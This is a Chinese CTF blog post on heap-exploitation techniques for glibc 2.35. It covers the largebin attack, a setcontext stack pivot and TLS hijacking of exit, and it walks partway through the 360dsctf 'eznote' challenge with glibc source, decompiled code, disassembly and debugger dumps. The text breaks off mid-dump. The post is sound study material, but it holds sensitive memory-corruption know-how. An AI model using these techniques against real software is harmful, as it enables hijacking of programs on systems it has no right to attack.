



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="pwn" />


<link rel="canonical" href="http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/">



  <title>
glibc-2.35一些手法 |
dreamcat = 我他喵的</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">glibc-2.35一些手法
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-08-01 16:24:13">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-08-01T16:24:13+08:00">2022-08-01</time>
  </span>
  <span class="item" title="Symbols count in article">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">Symbols count in article</span>
    <span>24k</span>
    <span class="text">words</span>
  </span>
  <span class="item" title="Reading time">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">Reading time</span>
    <span>22 mins.</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclgi503lj20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="dreamcat">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="我他喵的">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="glibc-235-ubuntu3-下的利用手法"><a class="markdownIt-Anchor" href="#glibc-235-ubuntu3-下的利用手法">#</a> glibc 2.35 ubuntu3 下的利用手法。</h1>
<p>原本我们以为 2.35 的时代不会来的这么快，但是最近 DS360ctf，以及强网杯几道题目的出现让 glibc 的 pwn 生存条件急剧下降。</p>
<p>首先我们谈谈为什么很多师傅都人为 2.35 的堆 pwn 是一个寒冬：</p>
<h2 id="现状"><a class="markdownIt-Anchor" href="#现状">#</a> 现状：</h2>
<p>之所以这样讲，一部分原因在于由于高版本的 glibc 的安全特性，封锁掉了很多的后门，特别是几个重要的 hook 不再是我们可以利用的了。但是这并不是让题目更难，觉得反而是解题出现严重的两级分化，一部分师傅研究过几个手法，几乎就可以做到一口气解决，因为利用的手法比较单一，就那么几种，即便是先提出的手法，其实原理也是大同小异。而对于不了解的师傅，就会陷入深渊，没有后门，或者自己习惯的后门都被堵上了，怎么走。</p>
<p>我们发现，其实大部分的情况都都是因为 hook 被禁止。而最近出现的手法，就要求我们要继续挖掘 io 的利用链。</p>
<p>所以这次我就要花费一些时间整理一部分。主要还是基于目前出现的一些题目的复现。</p>
<p>** 在 35 时代，我们必须学会 largebinattack</p>
<p>目前计划着是有</p>
<ul>
<li>house of apple 1</li>
<li>house of apple 2</li>
<li>house of apple 3</li>
<li>house of cat</li>
<li>house of emma</li>
<li>house of banana</li>
<li>tls 劫持</li>
</ul>
<h2 id="一些小总结"><a class="markdownIt-Anchor" href="#一些小总结">#</a> 一些小总结：</h2>
<p>目前遇到的 2.35 的题目都是基于同一个版本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dreamcat@dreamcat-virtual-machine:~/Desktop/360dsctf/eznote$ strings libc.so.6 |grep ubuntu</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+<span class="built_in">source</span>/glibc/+bugs&gt;.</span><br></pre></td></tr></table></figure>
<h2 id="largebinattack"><a class="markdownIt-Anchor" href="#largebinattack">#</a> largebinattack</h2>
<p>关键代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             victim_index = largebin_index (size);                               <span class="comment">//largebins</span></span><br><span class="line">             bck = bin_at (av, victim_index);</span><br><span class="line">             fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">             <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">               &#123;</span><br><span class="line">                 <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                 size |= PREV_INUSE;</span><br><span class="line">                 <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                 assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                 <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">	      &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                   &#123;</span><br><span class="line">                     fwd = bck;</span><br><span class="line">                     bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                     victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                     victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                   &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                   &#123;</span><br><span class="line">                     assert (chunk_main_arena (fwd));</span><br><span class="line">                     <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		  assert (chunk_main_arena (fwd));</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">		  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))                        <span class="comment">//相比于2.29新增加的判断</span></span><br><span class="line">                           malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       &#125;</span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)                               <span class="comment">////相比于2.29新增加的判断</span></span><br><span class="line">                       malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>相比于 2.29，新增加了两个检查。因为这些检查的原因，我们只有插入小 size 额可以实现 attack,</p>
<h3 id="要求"><a class="markdownIt-Anchor" href="#要求">#</a> 要求</h3>
<ol>
<li>对应的 bin 中只有一个 free_chunk,（此时 fd_nextsize,bk_nextsize 都指向自己）</li>
<li>修改 free_chunk 的 bk_nextsize 为目标地址减去 0x20.</li>
</ol>
<h2 id="setcontext"><a class="markdownIt-Anchor" href="#setcontext">#</a> setcontext</h2>
<p>在新的版本中，setcontext 不再是直接使用 rdi，而是使用 rdx 进行参数的一些设置。所以需要一些手段在 setcontext 之前，能够设置 rdx 为可控制的堆空间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  0x7f2c07abea6d &lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]</span><br><span class="line">► 0x7f2c07abea74 &lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]</span><br><span class="line">  0x7f2c07abea7b &lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]</span><br><span class="line">  0x7f2c07abea7f &lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]</span><br><span class="line">  0x7f2c07abea83 &lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]</span><br><span class="line">  0x7f2c07abea87 &lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]</span><br><span class="line">  0x7f2c07abea8b &lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]</span><br><span class="line">  0x7f2c07abea8f &lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2</span><br><span class="line">  0x7f2c07abea9b &lt;setcontext+107&gt;    je     setcontext+294                &lt;setcontext+294&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7f2c07abeb56 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]</span><br><span class="line">  0x7f2c07abeb5d &lt;setcontext+301&gt;    push   rcx</span><br><span class="line">  0x7f2c07abeb5e &lt;setcontext+302&gt;	mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">  0x7f2c07abeb62 &lt;setcontext+306&gt;:	mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">  0x7f2c07abeb66 &lt;setcontext+310&gt;:	mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">  0x7f2c07abeb6d &lt;setcontext+317&gt;:	mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">  0x7f2c07abeb71 &lt;setcontext+321&gt;:	mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">  0x7f2c07abeb75 &lt;setcontext+325&gt;:	mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">  0x7f2c07abeb7c &lt;setcontext+332&gt;:	xor    eax,eax</span><br><span class="line">  0x7f2c07abeb7e &lt;setcontext+334&gt;:	ret </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rdx 我们提前布置为我们可以控制的堆上，保证 rbp 大于、等于 rsp。除了 rcx，其他寄存器直接设置为 0，这里单独提出来 rcx，是因为 setcontext 最后 ret 的时候相当于，mov rip,[rsp]。加一个 ret 后，就可以劫持程序栈 rip.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> RBP  <span class="number">0x563dfde0ada0</span> —▸ <span class="number">0x7f3391d8b3e5</span> (iconv+<span class="number">197</span>) ◂— pop    rdi</span><br><span class="line"> RSP  <span class="number">0x563dfde0ad98</span> —▸ <span class="number">0x7f3391db4b52</span> (setcontext+<span class="number">290</span>) ◂— ret    </span><br><span class="line">*RIP  <span class="number">0x7f3391db4b7e</span> (setcontext+<span class="number">334</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x7f3391db4b66</span> &lt;setcontext+<span class="number">310</span>&gt;    mov    rcx, qword ptr [rdx + <span class="number">0x98</span>]</span><br><span class="line">   <span class="number">0x7f3391db4b6d</span> &lt;setcontext+<span class="number">317</span>&gt;    mov    r8, qword ptr [rdx + <span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7f3391db4b71</span> &lt;setcontext+<span class="number">321</span>&gt;    mov    r9, qword ptr [rdx + <span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x7f3391db4b75</span> &lt;setcontext+<span class="number">325</span>&gt;    mov    rdx, qword ptr [rdx + <span class="number">0x88</span>]</span><br><span class="line">   <span class="number">0x7f3391db4b7c</span> &lt;setcontext+<span class="number">332</span>&gt;    xor    eax, eax</span><br><span class="line"> ► <span class="number">0x7f3391db4b7e</span> &lt;setcontext+<span class="number">334</span>&gt;    ret </span><br></pre></td></tr></table></figure>
<p>我们的 rbp 设置为 rop 的开始而不是在下一条。但是我还没有搞清楚是否可以用 leave;ret; 浅尝了一下，不可以</p>
<h2 id="tls劫持exit执行流"><a class="markdownIt-Anchor" href="#tls劫持exit执行流">#</a> tls 劫持 exit 执行流</h2>
<h3 id="前提条件"><a class="markdownIt-Anchor" href="#前提条件">#</a> 前提条件</h3>
<ul>
<li>任意地址写一个堆地址，</li>
<li>泄露出 heap 地址，libc 地址</li>
<li>我们可以改写一个 chunk 的头部信息，prev_size,size。</li>
<li>程序可以执行 exit（这里我们仅仅测试了 main 函数直接 retutrn, 显式调用 exit 应该也可以，或者报错）</li>
</ul>
<h3 id="这里我们以360dsctf的eznote为例题"><a class="markdownIt-Anchor" href="#这里我们以360dsctf的eznote为例题">#</a> 这里我们以 360dsctf 的 eznote 为例题，</h3>
<p>程序实现了基本的增删改查，程序初始化的时候，申请了一个 chunk 用作一个指针数组，用于储存我们申请的 note.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">init_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x78</span>u);</span><br><span class="line">  gp = (global_list *)<span class="built_in">calloc</span>(<span class="number">7uLL</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里储存的结构体的大小为 0x18 字节，gp 一共申请了 7 个。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> note            struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_15)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: global_list/r</span><br><span class="line"><span class="number">00000000</span> size            dq ?                    ; XREF: add+<span class="number">28</span>/r</span><br><span class="line"><span class="number">00000008</span> ptr             dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> real_size       dq ?</span><br><span class="line"><span class="number">00000018</span> note            ends</span><br><span class="line"><span class="number">00000018</span></span><br></pre></td></tr></table></figure>
<p>size 是我们在申请 chunk 的时候提供的，real_size 是我们输入的数据的长度。</p>
<p>问题出在 add 的时候，同时存在的 note 的数量判断。这里值判断是否大于 7，所以我们申请第 8 个的时候，可以通过检查，那么就造成了数组的御姐，数组储存在 chunk 中，势必会影响下一个 chunk 的头部数据。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 count; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  __int64 size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">char</span> *ptr; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">char</span> *real_size; <span class="comment">// rax</span></span><br><span class="line">  note *v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)nums &gt; <span class="number">7</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too many notes.&quot;</span>);</span><br><span class="line">  count = <span class="number">0LL</span>;</span><br><span class="line">  v1 = <span class="number">1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( gp-&gt;<span class="built_in">list</span>[<span class="number">0</span>].ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++count;</span><br><span class="line">      <span class="keyword">if</span> ( !gp-&gt;<span class="built_in">list</span>[v1].ptr || count == <span class="number">7</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++v1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = getnum();</span><br><span class="line">  v3 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x3FF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid size.&quot;</span>);</span><br><span class="line">  ptr = (<span class="type">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  real_size = read_n(<span class="number">0</span>, ptr, v3);</span><br><span class="line">  v6 = &amp;gp-&gt;<span class="built_in">list</span>[v1];</span><br><span class="line">  v6-&gt;size = v3;</span><br><span class="line">  ++nums;</span><br><span class="line">  v6-&gt;ptr = ptr;</span><br><span class="line">  v6-&gt;real_size = (__int64)real_size;</span><br><span class="line">  <span class="keyword">return</span> __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Note%lu saved.\n&quot;</span>, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>数组最小限制为 0x400, 没有上限，所以我们可以尽情的构造较大的 chunk。</p>
<p>观察到，数组溢出时候的情况。因为我们申请 gp 数组的堆块大小只有 0xb0, 实际使用空间只有 0xa8, 那么，我们申请的 7 个结构体恰好可以沾满，那么第 8 个结构体的 size 就会占据下一个 chunk 的头部，修改 chunk_size。如果我们前面的 chunk 申请的比较小，第八个申请的很大，就会导致第一个 chunk 的 size 被更改，实现 overlap。</p>
<p>主义的时，一旦 8 号 chunk 申请处理啊，就无法 free。</p>
<p>泄露地址。</p>
<p>在向 note 中读入数据的时候，会自动补全空字符。输出使用格式化字符串，只是 add 时使用了 calloc，初始化 chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">read_n</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *ptr, __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">char</span> *pos; <span class="comment">// r15</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *end; <span class="comment">// r13</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-41h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  v3 = ptr;</span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size )</span><br><span class="line">  &#123;</span><br><span class="line">    pos = ptr;</span><br><span class="line">    v5 = <span class="number">1LL</span> - (_QWORD)ptr;</span><br><span class="line">    end = &amp;ptr[size];</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = (__int64)&amp;pos[v5];</span><br><span class="line">      <span class="keyword">if</span> ( read(fd, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> || buf == <span class="number">10</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      *pos++ = buf;</span><br><span class="line">      <span class="keyword">if</span> ( pos == end )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    *pos = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_8:</span><br><span class="line">    v3[size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v7 = size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">char</span> *)v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改掉第一个 notechunk 的 size 后，直接将其 free，就会将第二个覆盖到</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">28</span>gx <span class="number">0x5572d1a52290</span></span><br><span class="line"><span class="number">0x5572d1a52290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000b1</span></span><br><span class="line"><span class="number">0x5572d1a522a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5572d1a522b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000418</span></span><br><span class="line"><span class="number">0x5572d1a522c0</span>:	<span class="number">0x00005572d1a52770</span>	<span 